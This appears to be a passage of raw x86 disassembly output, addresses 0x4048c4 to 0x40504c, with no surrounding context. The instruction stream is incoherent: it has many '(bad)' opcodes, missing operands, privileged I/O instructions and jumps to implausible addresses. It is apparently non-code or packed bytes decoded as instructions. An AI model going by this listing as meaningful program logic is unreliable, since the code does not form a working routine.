  4048c4:	stos   DWORD PTR es:[edi],eax
  4048c5:	push   DWORD PTR [ebx-0x19]
  4048c8:	push   esp
  4048c9:	mov    eax,0x4f504afb
  4048ce:	pop    ss
  4048cf:	imul   ebp,DWORD PTR [ebp+edi*4+0x7939bfb2],0x9
  4048d7:	adc    ebp,DWORD PTR [ebx+0x60]
  4048da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048db:	data16 aad 0xe5
  4048de:	cmp    DWORD PTR fs:[esi+0x31],eax
  4048e2:	out    dx,eax
  4048e3:	retf   0xab3
  4048e6:	mov    ds:0xe9d65c9f,al
  4048eb:	push   ebx
  4048ec:	(bad)  
  4048ed:	sub    bh,BYTE PTR [edx+0x59db01a5]
  4048f3:	fwait
  4048f4:	inc    eax
  4048f5:	pop    esp
  4048f6:	(bad)  
  4048f7:	test   eax,0xe6d30548
  4048fc:	test   DWORD PTR [edx+eax*8+0x6b],esi
  404900:	iret   
  404901:	sub    esi,esi
  404903:	mov    dh,0xf2
  404906:	add    dl,BYTE PTR ds:0xb613892c
  40490c:	imul   edx,DWORD PTR [edi],0x22
  40490f:	mov    dl,ch
  404911:	or     ah,BYTE PTR [edi+ecx*4]
  404914:	sahf   
  404915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404916:	ret    
  404917:	push   ebx
  404918:	push   ebx
  404919:	int    0xe6
  40491b:	mov    edi,0xae23da46
  404920:	aas    
  404921:	iret   
  404922:	cmp    BYTE PTR [esi+0x68],dh
  404925:	add    DWORD PTR [ebp-0x58],ecx
  404928:	jle    0x404954
  40492a:	ret    
  40492b:	dec    ebx
  40492c:	fiadd  DWORD PTR [edi]
  40492e:	xchg   edi,eax
  40492f:	mov    dl,dl
  404931:	mov    DWORD PTR [ecx+edx*4+0x37],esi
  404935:	and    BYTE PTR [eax],al
  404937:	jmp    0x404929
  404939:	iret   
  40493a:	sbb    BYTE PTR [edx],0x2e
  40493d:	icebp  
  40493e:	scas   al,BYTE PTR es:[edi]
  40493f:	adc    eax,0x87b24c67
  404944:	xchg   ecx,eax
  404945:	fs mov edi,0x5fee2304
  40494b:	add    edi,edi
  40494d:	stos   BYTE PTR es:[edi],al
  40494e:	rol    BYTE PTR [edi],0x4a
  404951:	xor    DWORD PTR [edi+0x52],0xffffffb6
  404955:	stos   DWORD PTR es:[edi],eax
  404956:	fisubr DWORD PTR [eax+0x78]
  404959:	sub    DWORD PTR [ebp+0x5cd4d345],edi
  40495f:	xor    DWORD PTR [ecx-0x6c],esi
  404962:	pop    ebx
  404963:	in     eax,dx
  404964:	div    ah
  404966:	out    0x18,eax
  404968:	dec    edx
  404969:	jbe    0x4049dd
  40496b:	fidivr WORD PTR [esi-0x1eaaa750]
  404971:	ja     0x404961
  404973:	(bad)  
  404974:	sbb    al,0xca
  404976:	dec    esi
  404977:	push   esi
  404978:	in     al,dx
  404979:	add    eax,esp
  40497b:	inc    ebx
  40497c:	and    dl,cl
  40497e:	jg     0x404909
  404980:	call   0x5bd5:0x92a8e655
  404987:	adc    eax,0xac812e3a
  40498c:	dec    esi
  40498d:	xchg   edi,eax
  40498e:	or     al,0x1
  404990:	dec    ebp
  404991:	(bad)  
  404992:	in     al,0xf0
  404994:	lods   eax,DWORD PTR ds:[esi]
  404995:	jl     0x404986
  404997:	into   
  404998:	push   edi
  404999:	daa    
  40499a:	cmp    eax,0xa1084906
  40499f:	fwait
  4049a0:	aaa    
  4049a1:	mov    eax,ds:0xb648fa28
  4049a6:	fwait
  4049a7:	cmc    
  4049a8:	fld    DWORD PTR [eax]
  4049aa:	in     eax,dx
  4049ab:	dec    esp
  4049ac:	(bad)  [ebx]
  4049ae:	ins    BYTE PTR es:[edi],dx
  4049af:	aad    0xea
  4049b1:	nop
  4049b2:	adc    al,0xd2
  4049b4:	(bad)  
  4049b5:	dec    ebx
  4049b6:	adc    DWORD PTR [edx+esi*4+0x64],edx
  4049ba:	popa   
  4049bb:	xchg   BYTE PTR [ebx+0x33f9fe48],al
  4049c1:	out    0xe1,al
  4049c3:	stos   DWORD PTR es:[edi],eax
  4049c4:	pop    edi
  4049c5:	mov    ds:0x2c5552e5,eax
  4049ca:	push   edx
  4049cb:	addr16 add eax,0xd08f37a7
  4049d1:	in     al,dx
  4049d2:	push   es
  4049d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049d4:	pop    es
  4049d5:	pusha  
  4049d6:	xchg   ebx,eax
  4049d7:	test   BYTE PTR [eax+ecx*2-0x6e672de8],dl
  4049de:	out    dx,eax
  4049df:	das    
  4049e0:	dec    edx
  4049e1:	sub    edi,esi
  4049e3:	mov    cl,0x3a
  4049e5:	cwde   
  4049e6:	ror    al,cl
  4049e8:	dec    esi
  4049e9:	out    0x4d,eax
  4049eb:	xor    ebp,DWORD PTR [edi+0x7b]
  4049ee:	xor    DWORD PTR [ebp+0x2757c916],esp
  4049f4:	jnp    0x4049bb
  4049f6:	cli    
  4049f7:	repz jmp 0x4049dd
  4049fa:	adc    al,0x3a
  4049fc:	aam    0xf4
  4049fe:	push   ss
  4049ff:	daa    
  404a00:	icebp  
  404a01:	jp     0x4049f5
  404a03:	adc    DWORD PTR [edx-0x1e],0x310d8268
  404a0a:	arpl   WORD PTR [eax],bx
  404a0c:	sar    dl,1
  404a0e:	mov    ds:0xab75fb7f,al
  404a13:	mov    dh,0x2b
  404a15:	jecxz  0x4049de
  404a17:	shr    DWORD PTR [ebp+0x37b24216],cl
  404a1d:	aam    0x1a
  404a1f:	mov    edx,0xf6d1ee15
  404a24:	iret   
  404a25:	loopne 0x404a69
  404a27:	xchg   ebp,eax
  404a29:	add    BYTE PTR [edi],dl
  404a2b:	fdivr  DWORD PTR [eax-0x32]
  404a2e:	sbb    eax,0x3a78853
  404a33:	xor    BYTE PTR [ebp-0x7e],al
  404a36:	mov    esi,0x18fa1b55
  404a3b:	mov    ch,0x98
  404a3d:	dec    ebp
  404a3e:	outs   dx,BYTE PTR ds:[esi]
  404a3f:	xor    eax,0xebe94857
  404a44:	push   esp
  404a45:	imul   ebx,DWORD PTR [esi],0xffffff8c
  404a48:	jmp    0x404aa7
  404a4a:	mov    esp,cs
  404a4c:	pop    eax
  404a4d:	mov    ds:0x8425438a,al
  404a52:	stc    
  404a53:	sbb    BYTE PTR [esi-0x41],bh
  404a56:	mov    WORD PTR [edi+0x7c8576b9],gs
  404a5c:	leave  
  404a5d:	mov    edi,0x849b3c63
  404a62:	fs pop ds
  404a64:	test   DWORD PTR ds:[ecx],esi
  404a67:	rcr    BYTE PTR [eax],1
  404a69:	sub    al,BYTE PTR [edi-0x2b]
  404a6c:	xor    eax,0x65faa0df
  404a71:	xchg   edi,eax
  404a73:	bound  esp,QWORD PTR [esi-0x1]
  404a76:	das    
  404a77:	in     al,0x23
  404a79:	jle    0x404ab7
  404a7b:	gs mov ah,0xe3
  404a7e:	pop    ss
  404a7f:	outs   dx,BYTE PTR ds:[esi]
  404a80:	fisub  WORD PTR [esi+eiz*2+0x7fdca70a]
  404a87:	inc    eax
  404a88:	cmc    
  404a89:	jae    0x404a77
  404a8b:	retf   0x4e37
  404a8e:	jp     0x404a8c
  404a90:	cwde   
  404a91:	shr    bl,cl
  404a93:	cmc    
  404a94:	jecxz  0x404af8
  404a96:	not    bh
  404a98:	in     al,dx
  404a99:	test   DWORD PTR [edi-0x21],ecx
  404a9c:	rcl    BYTE PTR [edi+0x0],cl
  404a9f:	lods   al,BYTE PTR ds:[esi]
  404aa0:	jmp    0x404abf
  404aa2:	jae    0x404ad2
  404aa4:	in     al,dx
  404aa5:	sub    al,0xfb
  404aa7:	or     esp,DWORD PTR [ecx-0x7b08418b]
  404aad:	add    eax,0x9a3720be
  404ab2:	pop    ebp
  404ab3:	mov    bl,0x3b
  404ab5:	push   edx
  404ab6:	jl     0x404b2e
  404ab8:	aaa    
  404ab9:	xor    BYTE PTR [ecx+0x55a5fc32],0x9f
  404ac0:	mov    ch,0x63
  404ac2:	jb     0x404a98
  404ac4:	ror    BYTE PTR [edx+0x7c],1
  404ac7:	dec    edx
  404ac8:	je     0x404aeb
  404aca:	fld    DWORD PTR [edi]
  404acc:	popf   
  404acd:	sbb    ah,BYTE PTR [edi-0x464f7e3b]
  404ad3:	unpckhps xmm4,XMMWORD PTR [esi-0x45]
  404ad7:	or     BYTE PTR [ebx+0x64],dl
  404ada:	sub    ebp,DWORD PTR [eax]
  404adc:	and    esi,DWORD PTR [eax+0x26]
  404adf:	sbb    eax,0xf685af29
  404ae4:	or     al,0x38
  404ae6:	push   0xf0ea2cad
  404aeb:	mov    eax,?
  404aed:	adc    DWORD PTR [eax+0x198717b5],edi
  404af3:	cmp    DWORD PTR ds:0xdbcdaec6,ebp
  404af9:	inc    ecx
  404afa:	mov    ?,WORD PTR ds:0x5271bdbf
  404b00:	and    ebp,DWORD PTR [edx]
  404b02:	fs xchg esp,eax
  404b04:	mov    DWORD PTR ss:[eax+ebp*1+0x78],edx
  404b09:	fs push ebp
  404b0b:	out    dx,al
  404b0c:	inc    esi
  404b0d:	adc    BYTE PTR ds:0x11038b14,bl
  404b13:	(bad)  
  404b14:	or     bh,BYTE PTR [esi-0x69]
  404b17:	(bad)
  404b1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b1c:	lea    esp,[ebp-0x7f]
  404b1f:	adc    DWORD PTR [ebx],ebp
  404b21:	call   0x4af0:0xfd54df77
  404b28:	push   ss
  404b29:	lea    edi,[ecx-0x1736f62c]
  404b2f:	add    eax,0xe9e202ce
  404b34:	xor    DWORD PTR [esi+0x50],ebx
  404b37:	adc    bl,bl
  404b39:	(bad)  [edi+0xb]
  404b3c:	fnstcw WORD PTR [edx-0x59]
  404b3f:	aaa    
  404b40:	sub    dh,BYTE PTR [ebp-0xc]
  404b43:	xchg   BYTE PTR [ebx],al
  404b45:	jae    0x404b8c
  404b47:	push   0xffffffba
  404b49:	fcmovne st,st(5)
  404b4b:	fstp   DWORD PTR ds:0x8404c0a2
  404b51:	push   ebx
  404b52:	retf   0xd13f
  404b55:	xchg   edi,eax
  404b56:	inc    eax
  404b57:	mov    cl,0x31
  404b59:	daa    
  404b5a:	pop    ebx
  404b5b:	cld    
  404b5c:	pop    esi
  404b5d:	mov    bl,0x9f
  404b5f:	out    0xc4,al
  404b61:	sub    ah,BYTE PTR [edi+0x565fac0f]
  404b67:	push   ebx
  404b68:	and    DWORD PTR [eax],0xffffff87
  404b6b:	pop    ebp
  404b6c:	loope  0x404b28
  404b6e:	jb     0x404b0d
  404b70:	dec    eax
  404b71:	push   ss
  404b72:	jmp    0xb87b2dd1
  404b77:	sti    
  404b78:	pop    esp
  404b79:	cmp    bh,dh
  404b7b:	gs add eax,0x2d1989ae
  404b81:	rcr    DWORD PTR [edi+0x44],cl
  404b84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b85:	(bad)  
  404b86:	enter  0x2693,0x84
  404b8a:	jne    0x404bbf
  404b8c:	push   ecx
  404b8d:	inc    esi
  404b8e:	sub    esi,eax
  404b90:	rcr    BYTE PTR ds:0xabc7c02,0x90
  404b97:	push   esp
  404b98:	out    dx,eax
  404b99:	add    eax,0xd50b11bc
  404b9e:	jg     0x404c05
  404ba0:	sbb    bl,al
  404ba2:	xchg   ecx,eax
  404ba3:	pusha  
  404ba4:	or     BYTE PTR [edi+eiz*4-0x29722a79],0xfe
  404bac:	pop    es
  404bad:	int3   
  404bae:	cli    
  404baf:	sub    dh,ch
  404bb1:	mov    ah,0x4f
  404bb3:	jle    0x404b43
  404bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bb6:	sbb    eax,0x2c3a0078
  404bbb:	mov    edx,0x82a96c82
  404bc0:	ror    BYTE PTR [eax],cl
  404bc2:	mov    fs,esi
  404bc4:	(bad)  
  404bc5:	cmc    
  404bc6:	xchg   esi,eax
  404bc7:	fmul   DWORD PTR [ebx+0x3d]
  404bca:	(bad)  
  404bcb:	shl    DWORD PTR [ebx+0x7414fca5],1
  404bd1:	dec    eax
  404bd2:	mov    edi,eax
  404bd4:	mov    ds:0x27177f5c,eax
  404bd9:	add    BYTE PTR [edx+0x77],ah
  404bdc:	mov    dh,0xa0
  404bde:	xchg   edx,eax
  404bdf:	outs   dx,DWORD PTR ds:[esi]
  404be0:	mov    esp,0xdb4fe8d6
  404be5:	adc    dl,BYTE PTR [edx-0x12]
  404be8:	sub    eax,0xfbf01185
  404bed:	mov    esi,0xc0786574
  404bf2:	mov    dh,0x1e
  404bf4:	xor    eax,0xb18b8ee
  404bf9:	dec    eax
  404bfa:	nop
  404bfb:	cmp    cl,ch
  404bfd:	mov    esi,0x195c6e04
  404c02:	lods   al,BYTE PTR ds:[esi]
  404c03:	or     DWORD PTR [edx],ebx
  404c05:	mov    WORD PTR [edi],?
  404c07:	mov    ds:0x616ae169,eax
  404c0c:	add    dl,BYTE PTR [ebx-0x73]
  404c0f:	aas    
  404c10:	push   ebp
  404c11:	add    ax,0xc13e
  404c15:	clc    
  404c16:	xrelease mov BYTE PTR [ebx-0x68a2a223],cl
  404c1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c1e:	rcl    BYTE PTR [ebx+ecx*8+0x7dea6bab],1
  404c25:	and    al,0x1a
  404c27:	out    dx,al
  404c28:	repnz sar BYTE PTR [ebp+0xa6027c9],1
  404c2f:	ds repz in eax,dx
  404c32:	xor    bl,BYTE PTR [edi]
  404c34:	xchg   bl,cl
  404c36:	push   ebx
  404c37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c38:	mov    al,ds:0x3e3d1a1f
  404c3d:	jecxz  0x404c67
  404c3f:	mov    dl,0xe5
  404c41:	repnz lods al,BYTE PTR ds:[esi]
  404c43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c44:	mov    ah,0xf9
  404c46:	dec    edx
  404c47:	mov    cl,BYTE PTR [ecx+ebp*2-0x6f]
  404c4b:	mov    esp,0xc44865b9
  404c50:	xchg   esp,eax
  404c51:	or     DWORD PTR [ecx+0x5b],0x96830d6b
  404c58:	dec    ecx
  404c59:	and    eax,0x740779c
  404c5e:	scas   eax,DWORD PTR es:[edi]
  404c5f:	icebp  
  404c60:	outs   dx,DWORD PTR ds:[esi]
  404c61:	xchg   ecx,eax
  404c62:	loop   0x404cd1
  404c64:	mov    ecx,0xeee685f1
  404c69:	lods   eax,DWORD PTR ds:[esi]
  404c6a:	out    dx,eax
  404c6b:	out    0x4b,al
  404c6d:	mov    eax,ds:0x369093da
  404c72:	cmp    eax,0x63c08e47
  404c77:	inc    ebx
  404c78:	jne    0x404c88
  404c7a:	jmp    0x28cf:0xaa2bfb12
  404c81:	hlt    
  404c82:	call   0x691cdf76
  404c87:	(bad)  
  404c88:	lds    ebx,FWORD PTR [esi+0x6c0cea36]
  404c8e:	jo     0x404c89
  404c90:	gs adc eax,0xa3d97c3f
  404c96:	push   esp
  404c97:	scas   al,BYTE PTR es:[edi]
  404c98:	cld    
  404c99:	repz call FWORD PTR [ecx+0x302574ef]
  404ca0:	iret   
  404ca1:	push   ebp
  404ca2:	in     eax,0x5
  404ca4:	push   ss
  404ca5:	lahf   
  404ca6:	sub    al,0x92
  404ca8:	add    bh,al
  404caa:	call   0xf41d:0x1b59c08e
  404cb1:	cmp    al,BYTE PTR [esi]
  404cb3:	mov    BYTE PTR [edx-0x6b4c68d8],al
  404cb9:	pop    gs
  404cbb:	shl    DWORD PTR [ebx+0xc],cl
  404cbe:	icebp  
  404cbf:	repz into 
  404cc1:	not    DWORD PTR [ebp+0x7b]
  404cc4:	mov    al,ds:0xd8fded65
  404cc9:	jmp    0x27c9:0x67566164
  404cd0:	fcompp 
  404cd2:	dec    ebx
  404cd3:	adc    BYTE PTR [ebx],al
  404cd5:	loope  0x404d24
  404cd7:	dec    ebp
  404cd8:	cmc    
  404cd9:	fisubr WORD PTR [edi-0x1374b9e3]
  404cdf:	inc    ecx
  404ce0:	cmp    ebp,esp
  404ce2:	and    eax,0xf9be01ec
  404ce7:	aad    0xbd
  404ce9:	fst    DWORD PTR [edi]
  404ceb:	pop    ebx
  404cec:	xchg   edi,eax
  404ced:	cmc    
  404cee:	out    0x8b,al
  404cf0:	ficom  DWORD PTR [edi+ebx*2-0x2065581f]
  404cf7:	push   0xec2d824f
  404cfc:	inc    edx
  404cfd:	or     cl,BYTE PTR ds:0xb4bce657
  404d03:	sbb    eax,edx
  404d05:	neg    DWORD PTR [edx]
  404d07:	push   cs
  404d08:	xor    DWORD PTR [esi-0xd],ebx
  404d0b:	jge    0x404d6c
  404d0d:	das    
  404d0e:	mov    DWORD PTR [ecx+0x38],ebx
  404d11:	pop    edi
  404d12:	push   ebx
  404d13:	jae    0x404ce7
  404d15:	ins    DWORD PTR es:[edi],dx
  404d16:	xor    ecx,DWORD PTR [esi-0x40e30fde]
  404d1c:	mov    BYTE PTR [edx+ecx*8+0x54],al
  404d20:	std    
  404d21:	addr16 sahf 
  404d23:	ret    
  404d24:	pop    edx
  404d25:	mov    DWORD PTR [edx+0x4a],eax
  404d28:	mov    al,0xa8
  404d2a:	ret    0xed7
  404d2d:	cmp    dh,BYTE PTR [edi-0x3e]
  404d30:	jmp    0x4f769f97
  404d35:	test   eax,0x98e86922
  404d3a:	rol    BYTE PTR [edx],1
  404d3c:	clc    
  404d3d:	rcr    DWORD PTR [edx],1
  404d3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d40:	aam    0xcf
  404d42:	icebp  
  404d43:	pop    esp
  404d44:	int    0x42
  404d46:	push   esi
  404d47:	xchg   ecx,eax
  404d48:	sbb    eax,0x4f854632
  404d4d:	add    eax,0x24abf784
  404d52:	adc    DWORD PTR [edi-0x41db3866],esp
  404d58:	adc    dl,BYTE PTR [ebx-0xcba86e9]
  404d5e:	xchg   BYTE PTR [edx+0x43],cl
  404d61:	fisub  WORD PTR [eax]
  404d63:	mov    edi,0x8e275253
  404d68:	mov    esp,0xeb93fa33
  404d6d:	mov    dl,0x87
  404d6f:	mov    ah,0x15
  404d71:	shl    ebp,1
  404d73:	lods   eax,DWORD PTR ds:[esi]
  404d74:	test   BYTE PTR [ecx],0xcb
  404d77:	sub    BYTE PTR [ebp-0x12fd8fbc],0x6
  404d7e:	ss push ebp
  404d80:	adc    edi,DWORD PTR [esi]
  404d82:	inc    edx
  404d83:	adc    ah,BYTE PTR [edx]
  404d85:	add    eax,0xb2e4ede8
  404d8a:	cvtdq2ps xmm3,XMMWORD PTR [ecx+edi*4+0x1ea226fd]
  404d92:	dec    ebx
  404d93:	daa    
  404d94:	and    DWORD PTR [edx+0x78e965f6],edi
  404d9a:	and    edi,DWORD PTR [ebx]
  404d9c:	add    BYTE PTR [eax],bl
  404d9e:	sub    esi,DWORD PTR [ebx-0x4daca98]
  404da4:	add    ebx,DWORD PTR [ebp+0x572f112d]
  404daa:	(bad)  
  404dab:	fstp   DWORD PTR [ebx+ebp*4]
  404dae:	(bad)  
  404daf:	adc    al,ah
  404db1:	cmp    al,0x2d
  404db3:	push   edx
  404db4:	test   al,0x19
  404db6:	(bad)  
  404db7:	jmp    0xc8fe:0x3a4c5a22
  404dbe:	stc    
  404dbf:	cmp    ah,BYTE PTR [ebx+0x703230b6]
  404dc5:	stc    
  404dc6:	bound  ebp,QWORD PTR [eax]
  404dc8:	inc    esp
  404dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dca:	xor    DWORD PTR [esi-0x40],0xffffffa7
  404dce:	push   esi
  404dcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dd0:	jno    0x404da6
  404dd2:	fcom   QWORD PTR [edx]
  404dd4:	inc    eax
  404dd5:	hlt    
  404dd6:	outs   dx,DWORD PTR ds:[esi]
  404dd7:	outs   dx,BYTE PTR ds:[esi]
  404dd8:	pop    DWORD PTR [edi]
  404dda:	test   al,dh
  404ddc:	inc    ebp
  404ddd:	dec    esi
  404dde:	sbb    al,0x41
  404de0:	bound  ebx,QWORD PTR [edi+eiz*2]
  404de3:	xor    DWORD PTR fs:[ebx-0x19abe48],esp
  404dea:	cmp    al,0xa
  404dec:	push   esi
  404ded:	scas   al,BYTE PTR es:[edi]
  404dee:	in     eax,0x43
  404df0:	xchg   DWORD PTR [esi],ecx
  404df2:	push   ss
  404df3:	imul   esp,DWORD PTR [ecx],0xffffff82
  404df6:	inc    eax
  404df7:	sub    al,0x2a
  404df9:	std    
  404dfa:	clc    
  404dfb:	inc    edi
  404dfc:	nop
  404dfd:	repnz test DWORD PTR [ebp+0x5a],0xed6df809
  404e05:	in     eax,0xe9
  404e07:	mov    ebp,0x8ce5920d
  404e0c:	cmp    al,0x81
  404e0e:	cs ja  0x404e46
  404e11:	dec    edx
  404e12:	or     DWORD PTR [edi+ecx*4+0x65],ebx
  404e16:	mov    eax,ds:0x2fc8145a
  404e1b:	rcr    DWORD PTR [ecx-0x4d9cea86],1
  404e21:	out    0xd4,eax
  404e23:	in     al,0x10
  404e25:	leave  
  404e26:	pop    eax
  404e27:	fist   WORD PTR [ebp-0x73]
  404e2a:	dec    eax
  404e2b:	outs   dx,DWORD PTR ds:[esi]
  404e2c:	xor    BYTE PTR [edx+0x40],dh
  404e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e30:	add    edx,DWORD PTR [edi+0x45df6bc3]
  404e36:	in     al,0x5e
  404e38:	cmp    BYTE PTR [eax],cl
  404e3a:	retf   
  404e3b:	cmp    eax,0x56044e3b
  404e40:	and    dl,BYTE PTR [ebp+0x38]
  404e43:	retf   
  404e44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e45:	mov    al,ds:0xcbab826f
  404e4a:	(bad)  
  404e4b:	aas    
  404e4c:	push   0xffffff9b
  404e4e:	or     al,0x9c
  404e50:	les    ebx,FWORD PTR [edi]
  404e52:	jo     0x404ebb
  404e54:	mov    eax,0x6571f444
  404e59:	inc    ebx
  404e5a:	bound  edi,QWORD PTR [eax-0x21f92461]
  404e60:	xorps  xmm1,xmm1
  404e63:	pushf  
  404e64:	push   esp
  404e65:	pop    ebx
  404e66:	les    esi,FWORD PTR gs:[ebp-0xf]
  404e6a:	mov    ds:0xc552d13a,eax
  404e6f:	pop    eax
  404e70:	int3   
  404e71:	pushf  
  404e72:	addr16 nop
  404e74:	dec    esp
  404e75:	push   ebp
  404e76:	mov    bh,0x38
  404e78:	mov    ecx,0xd077d3c8
  404e7d:	inc    ecx
  404e7e:	and    ebp,DWORD PTR [esi+0x47]
  404e81:	pop    ecx
  404e82:	jge    0x404e73
  404e84:	add    al,0xdb
  404e86:	test   DWORD PTR [ecx-0x60],esi
  404e89:	mov    al,0x72
  404e8b:	and    edi,DWORD PTR [ebp+0x52]
  404e8e:	loop   0x404e7c
  404e90:	cmp    ecx,ebp
  404e92:	cmovno edx,eax
  404e95:	xlat   BYTE PTR ds:[ebx]
  404e96:	and    ch,BYTE PTR [ecx]
  404e98:	push   eax
  404e99:	sti    
  404e9a:	out    dx,eax
  404e9b:	test   DWORD PTR [eax+ecx*2+0x3e397f03],0xb9ea3d5d
  404ea6:	arpl   WORD PTR [edi-0x4caff2f7],bx
  404eac:	jb     0x404f06
  404eae:	pushf  
  404eaf:	jecxz  0x404f25
  404eb1:	cmp    ecx,DWORD PTR [esi-0x6]
  404eb4:	in     al,dx
  404eb5:	je     0x404f17
  404eb7:	fistp  DWORD PTR [ecx]
  404eb9:	jg     0x404f1d
  404ebb:	aam    0x71
  404ebd:	jo     0x404eb7
  404ebf:	xchg   ecx,eax
  404ec0:	nop
  404ec1:	outs   dx,DWORD PTR ds:[esi]
  404ec2:	mov    ds:0x3071221f,eax
  404ec7:	or     eax,0x70ab0329
  404ecc:	call   DWORD PTR [esi-0x1c]
  404ecf:	hlt    
  404ed0:	jmp    0x11f09cd3
  404ed5:	ds test eax,0x3eae85e7
  404edb:	inc    edi
  404edc:	pop    ecx
  404edd:	retf   0x4703
  404ee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ee1:	pop    eax
  404ee2:	loope  0x404e76
  404ee4:	mov    DWORD PTR [esi],edi
  404ee6:	jno    0x404ebb
  404ee8:	sar    ebp,cl
  404eea:	or     ebp,DWORD PTR [eax-0x72]
  404eed:	fstp   st(2)
  404eef:	or     dh,ch
  404ef1:	shl    cl,1
  404ef3:	jne    0x404e8c
  404ef5:	mov    ah,0xe7
  404ef7:	fdiv   QWORD PTR [edi-0x6d0299d2]
  404efd:	dec    eax
  404efe:	test   BYTE PTR [ebp-0x67],cl
  404f01:	cs inc edx
  404f03:	adc    DWORD PTR [eax-0x4],0x45b4a386
  404f0a:	in     al,0xcb
  404f0c:	(bad)  
  404f0d:	div    ah
  404f0f:	sbb    DWORD PTR [esi+0x72],ebp
  404f12:	pop    ss
  404f13:	stc    
  404f14:	cs xchg ebx,eax
  404f16:	lds    esp,FWORD PTR [ebx-0x790a5f68]
  404f1c:	xchg   edi,eax
  404f1d:	adc    DWORD PTR [edi+edi*1-0x2b64df28],esp
  404f24:	add    BYTE PTR [ebx],0xcf
  404f27:	stos   BYTE PTR es:[edi],al
  404f28:	sahf   
  404f29:	shl    BYTE PTR [esi],1
  404f2b:	popa   
  404f2c:	in     al,0x59
  404f2e:	nop
  404f2f:	dec    esp
  404f30:	adc    DWORD PTR [edi-0x2b36b5bc],0x50
  404f37:	mov    WORD PTR [ebx+0x7d],es
  404f3a:	sub    dl,ah
  404f3c:	gs mov ebp,0x4448d35b
  404f42:	xchg   BYTE PTR [edi+0x22],dl
  404f45:	push   ds
  404f46:	ror    BYTE PTR ds:[edx+0x33],cl
  404f4a:	clc    
  404f4b:	or     DWORD PTR [edx+0x203617af],0x1c
  404f52:	(bad)  
  404f53:	fcomip st,st(6)
  404f55:	outs   dx,BYTE PTR ds:[esi]
  404f56:	std    
  404f57:	mov    al,0x85
  404f59:	(bad)  [ebx+0xc870213]
  404f5f:	fsubp  st(3),st
  404f61:	and    DWORD PTR [ebx-0x62],edi
  404f64:	pop    es
  404f65:	push   ebx
  404f66:	mov    ds:0x1342fc40,eax
  404f6b:	mov    ebp,0x968a25a0
  404f70:	cmp    eax,ebx
  404f72:	cwde   
  404f73:	pop    ecx
  404f74:	dec    ebx
  404f75:	ins    BYTE PTR es:[edi],dx
  404f76:	shr    eax,0x69
  404f79:	and    al,0xec
  404f7b:	mov    cl,0x1b
  404f7d:	mov    dh,0xc3
  404f7f:	xor    eax,0x498ea626
  404f84:	push   ds
  404f85:	mov    ah,ah
  404f87:	push   ebp
  404f88:	loopne 0x404f51
  404f8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f8b:	aad    0x73
  404f8d:	(bad)  
  404f8e:	(bad)  
  404f8f:	shl    BYTE PTR [ebx-0x11],cl
  404f92:	sbb    DWORD PTR [ebp+0x68],ebp
  404f95:	cmp    al,BYTE PTR [edx]
  404f97:	retf   0x3a80
  404f9a:	add    edi,DWORD PTR [edi+ecx*4-0x2c]
  404f9e:	fwait
  404f9f:	cmc    
  404fa0:	push   ebx
  404fa1:	imul   DWORD PTR [edx]
  404fa3:	add    BYTE PTR [eax-0x48a007ce],ah
  404fa9:	or     BYTE PTR ds:0xd4012a49,bh
  404faf:	mov    DWORD PTR [esi+0x29c77553],ebp
  404fb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fb6:	imul   esi,DWORD PTR [ebp+0x5b4cfbfd],0xffffffc3
  404fbd:	(bad)  
  404fbe:	popf   
  404fbf:	sub    ah,BYTE PTR [ebx-0x3b]
  404fc2:	imul   ebx,ebx,0x7ff76ad0
  404fc8:	aam    0xf3
  404fca:	adc    dl,bh
  404fcc:	ret    0x9657
  404fcf:	adc    ebp,DWORD PTR [ebp-0x6ce48049]
  404fd5:	repz je 0x404fcc
  404fd8:	in     al,dx
  404fd9:	inc    ebx
  404fda:	pop    edi
  404fdb:	add    BYTE PTR [ebp+0x38d8e79a],bl
  404fe1:	jns    0x404fc2
  404fe3:	mov    bl,0xbf
  404fe5:	mov    eax,0xf5c9e639
  404fea:	(bad)  
  404feb:	jbe    0x404f70
  404fed:	popf   
  404fee:	inc    ebp
  404fef:	pop    ds
  404ff0:	dec    eax
  404ff1:	cli    
  404ff2:	mov    eax,0x96d97b3b
  404ff7:	pop    eax
  404ff8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ff9:	(bad)  
  404ffa:	sbb    ebp,DWORD PTR [ebx]
  404ffc:	sbb    ebp,DWORD PTR [eax-0xf]
  404fff:	mov    al,ds:0x93f4e551
  405004:	fstp   TBYTE PTR [esi+0x3c]
  405007:	test   al,0x2f
  405009:	push   eax
  40500a:	cwde   
  40500b:	mov    ebp,0x72097e10
  405010:	fidiv  DWORD PTR ds:0xe9dd7de4
  405016:	aam    0x82
  405018:	pop    eax
  405019:	adc    al,0xbb
  40501b:	inc    ebp
  40501c:	in     eax,0x2a
  40501e:	jne    0x404fc5
  405020:	dec    edx
  405021:	or     bh,BYTE PTR [esi+eax*1-0x7e]
  405025:	mov    ecx,0x9851858a
  40502a:	xor    BYTE PTR [esi-0x1e],0xa8
  40502e:	(bad)  
  40502f:	fdiv   QWORD PTR [ebx-0x14]
  405032:	cli    
  405033:	aam    0xf5
  405035:	jp     0x4050b2
  405037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405038:	jmp    0x84501878
  40503d:	dec    edx
  40503e:	add    al,BYTE PTR [eax]
  405040:	add    BYTE PTR [ecx+0x42b01805],al
  405046:	add    BYTE PTR [eax],cl
  405048:	rol    BYTE PTR [edx+0x0],0xff
  40504c:	jne    0x40503a
